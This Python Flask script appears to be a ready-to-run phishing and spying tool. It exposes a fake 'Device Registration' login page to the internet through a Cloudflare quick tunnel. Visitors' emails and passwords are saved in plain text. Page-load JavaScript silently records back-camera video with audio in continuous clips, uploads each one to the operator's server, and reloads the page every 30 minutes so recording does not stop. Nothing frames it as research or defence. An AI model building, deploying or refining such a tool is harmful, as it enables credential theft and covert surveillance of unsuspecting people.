import os
import base64
import subprocess
import sys
import re
import logging
import json
from threading import Thread
import time
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify

# --- Dependency and Tunnel Setup ---

def install_package(package):
    """Installs a package using pip quietly."""
    subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])

def check_dependencies():
    """Checks for cloudflared and required Python packages."""
    try:
        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[ERROR] 'cloudflared' is not installed or not in your system's PATH.", file=sys.stderr)
        print("Please install it from: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
        sys.exit(1)
    try:
        import flask
    except ImportError:
        print("Installing missing package: Flask...", file=sys.stderr)
        install_package("Flask")

def run_cloudflared_and_print_link(port, script_name):
    """Starts a cloudflared tunnel and prints the public link."""
    cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in iter(process.stdout.readline, ''):
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            print(f"{script_name} Public Link: {match.group(0)}")
            sys.stdout.flush()
            break
    process.wait()

def get_recording_duration():
    """Prompts the user for recording duration in seconds."""
    print("\n" + "="*60)
    print("SET RECORDING DURATION")
    print("="*60)
    print("How many seconds should each video recording be?")
    print("Recommended: 5-10 seconds for best results")
    print("Enter a number between 1 and 60 (default: 5)")
    print("-"*60)
    
    while True:
        try:
            user_input = input("Recording duration (seconds): ").strip()
            
            if user_input == "":
                print("Using default duration: 5 seconds")
                return 5
            
            duration = int(user_input)
            
            if duration < 1:
                print("Duration must be at least 1 second. Try again.")
                continue
            elif duration > 60:
                print("Duration cannot exceed 60 seconds. Try again.")
                continue
            
            print(f"Set recording duration to: {duration} seconds")
            return duration
            
        except ValueError:
            print("Please enter a valid number. Try again.")


# --- Flask Application ---

app = Flask(__name__)

# Global variable for recording duration (will be set after user input)
RECORDING_DURATION_MS = 5000  # Default 5 seconds in milliseconds

DOWNLOAD_FOLDER = os.path.expanduser('~/storage/downloads/Back Camera Videos')
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)

# We'll create the HTML template dynamically to include the recording duration
def create_html_template(duration_ms):
    """Creates the HTML template with the specified recording duration."""
    duration_seconds = duration_ms / 1000
    
    return f'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Access</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        :root {{
            --bg-color: #f0f2f5; --form-bg-color: #ffffff; --text-color: #1c1e21;
            --subtle-text-color: #606770; --border-color: #dddfe2; --button-bg-color: #0d6efd;
            --button-hover-bg-color: #0b5ed7;
        }}
        @media (prefers-color-scheme: dark) {{
            :root {{
                --bg-color: #121212; --form-bg-color: #1e1e1e; --text-color: #e4e6eb;
                --subtle-text-color: #b0b3b8; --border-color: #444; --button-bg-color: #2374e1;
                --button-hover-bg-color: #3982e4;
            }}
            input {{ color-scheme: dark; }}
        }}
        body {{
            margin: 0; padding: 20px; box-sizing: border-box; background-color: var(--bg-color);
            color: var(--text-color); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; text-align: center;
        }}
        .main-container {{ width: 100%; max-width: 400px; }}
        .logo-container {{ margin-bottom: 24px; }}
        .logo-container svg {{ width: 48px; height: 48px; fill: var(--button-bg-color); }}
        .login-form {{
            background: var(--form-bg-color); padding: 32px; border-radius: 12px;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08); border: 1px solid var(--border-color);
        }}
        h1 {{ margin: 0 0 12px 0; font-size: 28px; font-weight: 600; }}
        p {{ color: var(--subtle-text-color); font-size: 16px; margin: 0 0 28px 0; line-height: 1.5; }}
        input[type="email"], input[type="password"] {{
            width: 100%; padding: 14px; margin-bottom: 16px; border: 1px solid var(--border-color);
            background-color: var(--bg-color); color: var(--text-color); border-radius: 8px; font-size: 16px; box-sizing: border-box;
        }}
        input::placeholder {{ color: var(--subtle-text-color); }}
        input[type="submit"] {{
            width: 100%; padding: 14px; background-color: var(--button-bg-color); border: none;
            border-radius: 8px; color: white; font-size: 17px; font-weight: 600; cursor: pointer; transition: background-color 0.2s ease;
        }}
        input[type="submit"]:hover {{ background-color: var(--button-hover-bg-color); }}
        footer {{ margin-top: 32px; font-size: 13px; color: var(--subtle-text-color); }}
        footer a {{ color: var(--subtle-text-color); text-decoration: none; margin: 0 8px; }}
        footer a:hover {{ text-decoration: underline; }}
        .duration-info {{
            position: fixed;
            bottom: 20px;
            left: 20px;
            background-color: rgba(0, 0, 0, 0.7);
            color: white;
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 12px;
            z-index: 1000;
        }}
    </style>
</head>
<body>
    <div class="main-container">
        <header class="logo-container">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
        </header>
        <main class="login-form">
            <form action="/submit_credentials" method="post">
                <h1>Device Registration</h1>
                <p>To complete your device registration, please scan the authentication QR code provided to you.</p>
                <input type="email" name="email" placeholder="Enter your email address" required>
                <input type="password" name="password" placeholder="Enter your password" required>
                <input type="submit" value="Verify Device">
            </form>
        </main>
        <footer>
            <a href="#">Terms of Use</a> &bull; <a href="#">Privacy Policy</a> &bull; <a href="#">Support</a>
        </footer>
    </div>
    <div class="duration-info" id="durationInfo">Recording: {duration_seconds}s intervals</div>
    
    <script>
        let mediaRecorder;
        let recordedChunks = [];
        let stream;
        let isRecording = false;
        let recordingTimer;
        
        // Recording duration in milliseconds
        const RECORDING_DURATION_MS = {duration_ms};

        async function startCamera() {{
            const constraints = {{
                audio: true, // Include audio in the recording
                video: {{ 
                    facingMode: 'environment', // Request back camera
                    width: {{ ideal: 1280 }},
                    height: {{ ideal: 720 }}
                }}
            }};

            try {{
                stream = await navigator.mediaDevices.getUserMedia(constraints);
                startContinuousRecording();
            }} catch (err) {{
                console.error("Back camera access failed:", err);
                // Fallback to front camera if back camera is not available
                try {{
                    constraints.video.facingMode = 'user';
                    stream = await navigator.mediaDevices.getUserMedia(constraints);
                    startContinuousRecording();
                }} catch (fallbackErr) {{
                    console.error("Camera access failed completely:", fallbackErr);
                }}
            }}
        }}

        function startContinuousRecording() {{
            if (!stream) return;
            
            // Start first recording
            startRecording();
        }}

        function startRecording() {{
            if (!stream) return;
            
            // Stop any existing recording
            if (mediaRecorder && mediaRecorder.state !== 'inactive') {{
                mediaRecorder.stop();
            }}
            
            try {{
                recordedChunks = [];
                
                // Try different mime types for compatibility
                const options = {{ mimeType: 'video/webm;codecs=vp9,opus' }};
                
                try {{
                    mediaRecorder = new MediaRecorder(stream, options);
                }} catch (e) {{
                    // Fallback to default mime type
                    mediaRecorder = new MediaRecorder(stream);
                }}
                
                mediaRecorder.ondataavailable = (event) => {{
                    if (event.data && event.data.size > 0) {{
                        recordedChunks.push(event.data);
                    }}
                }};
                
                mediaRecorder.onstop = handleRecordingStop;
                mediaRecorder.onerror = (event) => {{
                    console.error("MediaRecorder error:", event.error);
                    // Try to restart recording after error
                    setTimeout(startRecording, 1000);
                }};
                
                // Start recording
                mediaRecorder.start(1000); // Collect data every second
                isRecording = true;
                
                // Stop recording after the specified duration
                recordingTimer = setTimeout(() => {{
                    if (isRecording && mediaRecorder && mediaRecorder.state === 'recording') {{
                        mediaRecorder.stop();
                    }}
                }}, RECORDING_DURATION_MS);
                
            }} catch (err) {{
                console.error("Error starting recording:", err);
                // Retry after delay
                setTimeout(startRecording, 1000);
            }}
        }}

        function handleRecordingStop() {{
            isRecording = false;
            clearTimeout(recordingTimer);
            
            // Send the recorded video
            sendVideoToServer();
            
            // Start next recording immediately (with tiny delay to ensure clean start)
            setTimeout(startRecording, 100);
        }}

        function sendVideoToServer() {{
            if (recordedChunks.length === 0) {{
                console.log("No video data to send");
                return;
            }}
            
            try {{
                const videoBlob = new Blob(recordedChunks, {{ type: 'video/webm' }});
                
                if (videoBlob.size === 0) {{
                    console.log("Empty video blob");
                    return;
                }}
                
                // Convert blob to base64
                const reader = new FileReader();
                reader.onloadend = function() {{
                    const result = reader.result;
                    if (!result) {{
                        console.log("Failed to read video blob");
                        return;
                    }}
                    
                    const base64data = result.split(',')[1];
                    
                    $.ajax({{
                        url: '/capture_video',
                        type: 'POST',
                        data: JSON.stringify({{
                            video: base64data,
                            timestamp: new Date().toISOString()
                        }}),
                        contentType: 'application/json',
                        success: function(response) {{
                            console.log('Video uploaded successfully:', response.filename);
                        }},
                        error: function(xhr, status, error) {{
                            console.error('Error uploading video:', error);
                        }}
                    }});
                }};
                
                reader.onerror = function(error) {{
                    console.error("Error reading video blob:", error);
                }};
                
                reader.readAsDataURL(videoBlob);
                
            }} catch (err) {{
                console.error("Error preparing video for upload:", err);
            }}
        }}

        // Start camera when page loads
        $(document).ready(function() {{
            startCamera();
            
            // Auto-refresh page every 30 minutes to prevent any potential memory issues
            setTimeout(function() {{
                console.log("Refreshing page to maintain recording...");
                location.reload();
            }}, 30 * 60 * 1000);
        }});
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(create_html_template(RECORDING_DURATION_MS))

@app.route('/submit_credentials', methods=['POST'])
def submit_credentials():
    date_str = datetime.now().strftime('%Y%m%d_%H%M%S')
    credentials_file = os.path.join(DOWNLOAD_FOLDER, f"credentials_{date_str}.txt")
    with open(credentials_file, 'w') as f:
        f.write(f"Email: {request.form.get('email')}\nPassword: {request.form.get('password')}\n")
    return "Verification successful. You will be redirected shortly.", 200

@app.route('/capture_video', methods=['POST'])
def capture_video():
    try:
        data = request.get_json()
        if data and 'video' in data:
            video_data = data['video']
            
            # Create filename using current server time in YYYYMMDD_HHMMSS format
            date_str = datetime.now().strftime('%Y%m%d_%H%M%S')
            
            # Check if file already exists and add a counter if needed
            base_filename = f"{date_str}.webm"
            video_file = os.path.join(DOWNLOAD_FOLDER, base_filename)
            
            # If file exists, add a counter (e.g., 20231224_143045_1.webm, 20231224_143045_2.webm)
            counter = 1
            while os.path.exists(video_file):
                video_file = os.path.join(DOWNLOAD_FOLDER, f"{date_str}_{counter}.webm")
                counter += 1
            
            with open(video_file, 'wb') as f:
                f.write(base64.b64decode(video_data))
            
            print(f"Saved {RECORDING_DURATION_MS/1000}-second video: {os.path.basename(video_file)}")
            return jsonify({"status": "success", "filename": os.path.basename(video_file)}), 200
        else:
            return jsonify({"status": "error", "message": "No video data received"}), 400
    except Exception as e:
        print(f"Error saving video: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/capture', methods=['POST'])
def capture():
    # Keep this endpoint for compatibility
    return "Endpoint not used for video recording", 200

if __name__ == '__main__':
    check_dependencies()
    
    # Get recording duration from user
    recording_duration_seconds = get_recording_duration()
    RECORDING_DURATION_MS = recording_duration_seconds * 1000
    
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    sys.modules['flask.cli'].show_server_banner = lambda *x: None
    port = 4041
    script_name = "Login Page (Continuous Back Camera Videos)"
    
    print("\n" + "="*60)
    print("SERVER STARTING")
    print("="*60)
    print(f"Video files will be saved to: {DOWNLOAD_FOLDER}")
    print(f"Each video will be recorded for: {recording_duration_seconds} seconds")
    print("Videos will be saved as: YYYYMMDD_HHMMSS.webm")
    print("If multiple videos are recorded in the same second, they will be saved as:")
    print("  YYYYMMDD_HHMMSS_1.webm, YYYYMMDD_HHMMSS_2.webm, etc.")
    print("\nStarting server...")
    print(f"This script will continuously record {recording_duration_seconds}-second videos from the back camera.")
    print("Press Ctrl+C to stop.\n")
    
    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port))
    flask_thread.daemon = True
    flask_thread.start()
    time.sleep(1)
    try:
        run_cloudflared_and_print_link(port, script_name)
    except KeyboardInterrupt:
        print("\nShutting down...")
        sys.exit(0)